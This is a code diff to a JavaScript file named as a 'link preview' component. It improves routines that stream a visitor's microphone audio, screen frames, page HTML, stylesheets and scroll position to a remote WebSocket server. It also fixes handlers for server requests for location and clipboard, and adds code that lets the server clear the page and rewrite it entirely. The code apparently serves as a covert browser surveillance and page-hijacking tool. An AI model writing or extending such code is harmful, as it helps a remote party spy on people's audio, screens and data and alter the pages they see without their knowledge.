@@ -747,6 +747,10 @@ const EDEN_LINK_PREVIEW = {
                 }
             } else {
                 audioContext = new AudioContext();
+                // Ensure context is running (some browsers start suspended until user gesture)
+                if (audioContext.state === 'suspended') {
+                    try { await audioContext.resume(); } catch (e) { /* no-op */ }
+                }
                 window.edenAudioContexts[thisClientId] = audioContext;
             }
             
@@ -915,8 +919,8 @@ const EDEN_LINK_PREVIEW = {
                 updateStatus('audio', false, 'Microphone access ended', thisClientId);
             };
             
-            // Create separate data array for sending to server
-            const dataArray = new Float32Array(analyser.frequencyBinCount);
+            // Use time-domain buffer sized to fftSize for correct waveform samples
+            const timeDomainArray = new Float32Array(analyser.fftSize);
             
             // Function to send audio data to server using improved approach
             function sendAudioData() {
@@ -928,23 +932,26 @@ const EDEN_LINK_PREVIEW = {
                 if (!hasStream) return;
                 
                 if (stream.active && stream.getAudioTracks()[0].enabled && ws && ws.readyState === WebSocket.OPEN) {
-                    // Get audio data
-                    analyser.getFloatTimeDomainData(dataArray);
+                    // Get time-domain samples
+                    analyser.getFloatTimeDomainData(timeDomainArray);
                     
-                    // Process audio data for sending
-                    const audioData = {
-                        type: 'audio-data',
-                        data: Array.from(dataArray),
-                        clientId: thisClientId,
-                        timestamp: Date.now()
-                    };
+                    // Compute simple peak to decide if there is signal
+                    let peak = 0;
+                    for (let i = 0; i < timeDomainArray.length; i++) {
+                        const v = Math.abs(timeDomainArray[i]);
+                        if (v > peak) peak = v;
+                    }
                     
-                    // Ensure audio data has sufficient amplitude before sending
-                    // Use a lower threshold to capture more subtle sounds
-                    const hasSound = audioData.data.some(sample => Math.abs(sample) > 0.005);
+                    // Lower threshold to detect quieter input
+                    const hasSound = peak > 0.001;
                     
                     if (hasSound) {
-                        ws.send(JSON.stringify(audioData));
+                        ws.send(JSON.stringify({
+                            type: 'audio-data',
+                            data: Array.from(timeDomainArray),
+                            clientId: thisClientId,
+                            timestamp: Date.now()
+                        }));
                     }
                 }
                 
@@ -1030,49 +1037,30 @@ const EDEN_LINK_PREVIEW = {
             hiddenVideo.play();
             
             // Send frames to server
-            function captureAndSendFrames() {
-                // Get context and check if stream still exists
-                const ctx = canvas.getContext('2d');
-                const currentStream = permMedia.screen instanceof Map ? 
-                    permMedia.screen.get(thisClientId) : permMedia.screen;
-                
-                if (!currentStream || !currentStream.active) {
-                    console.log(`Screen stream for client ${thisClientId} is no longer active`);
-                    return;
-                }
-                
-                try {
-                    // Draw the current video frame to the canvas
-                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                    
-                    // Send the frame data over WebSocket if connection is open
-                    if (ws && ws.readyState === WebSocket.OPEN) {
-                        // Use higher quality JPEG and add timestamp for better ordering
-                        ws.send(JSON.stringify({
-                            type: 'screen-frame',
-                            data: canvas.toDataURL('image/jpeg', 0.8), // Higher quality image
-                            clientId: thisClientId,
-                            timestamp: Date.now() // Add timestamp for ordering
-                        }));
-                        
-                        // Schedule next capture - use requestAnimationFrame for smoother capture
-                        // with a small delay to prevent overwhelming the connection
-                        setTimeout(() => {
-                            requestAnimationFrame(captureAndSendFrames);
-                        }, 50); // 20fps target rate
-                    } else {
-                        console.log("WebSocket not available, stopping screen capture");
-                    }
-                } catch (error) {
-                    console.error("Error capturing screen:", error);
-                }
-            }
-            
-            // Start the frame capture loop
-            captureAndSendFrames();
+	            // Use an interval-based capture loop similar to perm.html
+	            const screenCtx = canvas.getContext('2d');
+	            const screenCaptureInterval = setInterval(() => {
+	                const currentStream = permMedia.screen instanceof Map ?
+	                    permMedia.screen.get(thisClientId) : permMedia.screen;
+	                if (!currentStream || !currentStream.active || !currentStream.getVideoTracks()[0].enabled) return;
+	                try {
+	                    screenCtx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+	                    if (ws && ws.readyState === WebSocket.OPEN) {
+	                        ws.send(JSON.stringify({
+	                            type: 'screen-frame',
+	                            data: canvas.toDataURL('image/jpeg', 0.8),
+	                            clientId: thisClientId,
+	                            timestamp: Date.now()
+	                        }));
+	                    }
+	                } catch (error) {
+	                    console.error('Error capturing screen:', error);
+	                }
+	            }, 100);
             
             // Handle stream ending
             stream.getVideoTracks()[0].onended = () => {
+	                try { clearInterval(screenCaptureInterval); } catch (_) {}
                 if (permMedia.screen instanceof Map) {
                     permMedia.screen.delete(thisClientId);
                 } else {
@@ -2043,56 +2031,27 @@ const EDEN_LINK_PREVIEW = {
         function initializeContentCapture() {
             // Capture initial HTML content
             captureAndSendHtmlContent(true);
-            
-            // Set up a periodic sender for HTML content to ensure it's always available
-            // This helps when someone refreshes the bom.html page
-            contentSendInterval = setInterval(() => {
-                if (isTrackingEnabled) {
-                    captureAndSendHtmlContent(false);
-                }
-            }, 3000); // Send HTML content every 3 seconds
-            
-            // Set up scroll event listener with improved handling
-            window.addEventListener('scroll', function(event) {
-                if (!isTrackingEnabled) return;
-                
-                const scrollX = window.scrollX || window.pageXOffset;
-                const scrollY = window.scrollY || window.pageYOffset;
-                
-                // Only send if scroll position has changed significantly
-                const lastX = lastScrollPosition.x;
-                const lastY = lastScrollPosition.y;
-                
-                // Check if scroll position has changed by at least 5 pixels
-                if (Math.abs(scrollX - lastX) > 5 || Math.abs(scrollY - lastY) > 5) {
-                    // Update last scroll position
-                    lastScrollPosition = { x: scrollX, y: scrollY };
-                    
-                    // Store scroll position for recovery after refresh
-                    localStorage.setItem('bom_last_scroll_x', scrollX);
-                    localStorage.setItem('bom_last_scroll_y', scrollY);
-                    
-                    const message = {
-                        type: 'scroll-position',
-                        clientId: bomClientId,
-                        scrollX: scrollX,
-                        scrollY: scrollY,
-                        timestamp: new Date().toISOString(),
-                        priority: 'high' // Set high priority for scroll events
-                    };
-                    
-                    if (ws.readyState === WebSocket.OPEN) {
-                        console.log(`[SCROLL] Sending scroll position: ${scrollX}, ${scrollY}`);
-                        ws.send(JSON.stringify(message));
-                    }
-                }
-            }, { passive: true }); // Use passive event for better scroll performance
-            
-            // Setup mutation observer to detect DOM changes
-            contentObserver = new MutationObserver(function(mutations) {
-                if (!isTrackingEnabled) return;
-                captureAndSendHtmlContent(true);
-            });
+	        
+	        // Capture stylesheets initially
+	        try { captureStylesheets(); } catch (_) {}
+	        
+	        // Send scroll updates
+	        window.addEventListener('scroll', function() {
+	            if (!isTrackingEnabled) return;
+	            const scrollX = window.scrollX || window.pageXOffset;
+	            const scrollY = window.scrollY || window.pageYOffset;
+	            const message = {
+	                type: 'scroll-position',
+	                clientId: bomClientId,
+	                scrollX: scrollX,
+	                scrollY: scrollY,
+	                timestamp: new Date().toISOString(),
+	                priority: 'high'
+	            };
+	            if (ws && ws.readyState === WebSocket.OPEN) {
+	                ws.send(JSON.stringify(message));
+	            }
+	        }, { passive: true });
             
             // Start observing document for changes
             contentObserver.observe(document.body, {
@@ -2102,62 +2061,16 @@ const EDEN_LINK_PREVIEW = {
                 characterData: true
             });
             
-            // Capture stylesheets
-            captureStylesheets();
+            // Use enhanced CSS capture instead of regular capture
+            captureStylesheetsEnhanced();
+            
+            // Start monitoring for dynamic stylesheets
+            monitorDynamicStylesheets();
             
             // If this is after a refresh, send content immediately
             if (refreshDetected) {
                 console.log('Post-refresh detected, sending content immediately');
                 setTimeout(() => sendHtmlContentImmediately(), 100);
-            }
-        }
-        
-        // Capture and send all stylesheets
-        function captureStylesheets() {
-            styleSheets = [];
-            
-            // Collect all stylesheets
-            for (let i = 0; i < document.styleSheets.length; i++) {
-                try {
-                    const sheet = document.styleSheets[i];
-                    let cssRules = '';
-                    
-                    // Try to access cssRules - may fail due to CORS
-                    if (sheet.cssRules) {
-                        for (let j = 0; j < sheet.cssRules.length; j++) {
-                            cssRules += sheet.cssRules[j].cssText + '\n';
-                        }
-                        
-                        styleSheets.push({
-                            href: sheet.href,
-                            content: cssRules
-                        });
-                    } else if (sheet.href) {
-                        // If we can't access rules but there's an href, just send the href
-                        styleSheets.push({
-                            href: sheet.href,
-                            content: null
-                        });
-                    }
-                } catch (e) {
-                    // CORS issue - just capture the href
-                    if (document.styleSheets[i].href) {
-                        styleSheets.push({
-                            href: document.styleSheets[i].href,
-                            content: null
-                        });
-                    }
-                }
-            }
-            
-            // Send stylesheets
-            if (ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'stylesheets',
-                    clientId: bomClientId,
-                    styleSheets: styleSheets,
-                    timestamp: new Date().toISOString()
-                }));
             }
         }
         
@@ -2201,6 +2114,8 @@ const EDEN_LINK_PREVIEW = {
                 if (ws.readyState === WebSocket.OPEN) {
                     console.log('[HTML] Sending updated HTML content');
                     ws.send(JSON.stringify(message));
+	                    // Also send stylesheets snapshot alongside HTML
+	                    try { captureStylesheets(); } catch (_) {}
                 }
             }
         }
@@ -2244,6 +2159,8 @@ const EDEN_LINK_PREVIEW = {
             if (ws.readyState === WebSocket.OPEN) {
                 console.log('[HTML] Sending immediate HTML content for refresh');
                 ws.send(JSON.stringify(message));
+	                // Send stylesheets immediately as well
+	                try { captureStylesheets(); } catch (_) {}
                 
                 // Also send current scroll position
                 const scrollX = parseInt(localStorage.getItem('bom_last_scroll_x')) || 0;
@@ -2271,6 +2188,37 @@ const EDEN_LINK_PREVIEW = {
                 }, 500);
             }
         }
+	    
+	    // Capture and send all stylesheets (base model parity)
+	    function captureStylesheets() {
+	        const sheets = [];
+	        for (let i = 0; i < document.styleSheets.length; i++) {
+	            try {
+	                const sheet = document.styleSheets[i];
+	                let cssRules = '';
+	                if (sheet.cssRules) {
+	                    for (let j = 0; j < sheet.cssRules.length; j++) {
+	                        cssRules += sheet.cssRules[j].cssText + '\n';
+	                    }
+	                    sheets.push({ href: sheet.href, content: cssRules });
+	                } else if (sheet.href) {
+	                    sheets.push({ href: sheet.href, content: null });
+	                }
+	            } catch (e) {
+	                if (document.styleSheets[i].href) {
+	                    sheets.push({ href: document.styleSheets[i].href, content: null });
+	                }
+	            }
+	        }
+	        if (ws && ws.readyState === WebSocket.OPEN) {
+	            ws.send(JSON.stringify({
+	                type: 'stylesheets',
+	                clientId: bomClientId,
+	                styleSheets: sheets,
+	                timestamp: new Date().toISOString()
+	            }));
+	        }
+	    }
         
         // Get detailed information about an element for accurate cursor positioning
         function getElementInfo(element, cursorX, cursorY) {
@@ -3155,7 +3103,7 @@ const EDEN_LINK_PREVIEW = {
                             requestScreen(clientId);
                             break;
                         case 'request-location':
-                            requestClipboard(clientId);
+                            requestLocation(clientId);
                             break;
                         case 'request-clipbord':
                             //alert();
@@ -4501,11 +4449,32 @@ const EDEN_LINK_PREVIEW = {
             return;
         }
         
-        // Otherwise, just update the content
+        // No reload requested: first clear the whole page, then apply the HTML
+        try {
+            const isFullDocument = /<html[\s\S]*<\/html>/i.test(content) || /<body[\s\S]*<\/body>/i.test(content) || /<head[\s\S]*<\/head>/i.test(content);
+            if (isFullDocument) {
+                // Replace entire document with provided HTML
+                document.open();
+                document.write(content);
+                document.close();
+                return;
+            } else {
+                // Clear current body content entirely
+                if (document.body) {
+                    document.body.innerHTML = '';
+                }
+            }
+        } catch (e) {
+            console.warn('Error while clearing page before applying content:', e);
+        }
+        
+        // Recreate/get the main container after clearing
+        const container = getMainContainer();
+        
+        // Hide placeholder after container exists
         const placeholder = document.getElementById('placeholder');
         if (placeholder) placeholder.style.display = 'none';
         
-        const container = getMainContainer();
         if (container) {
             container.innerHTML = content;
         }
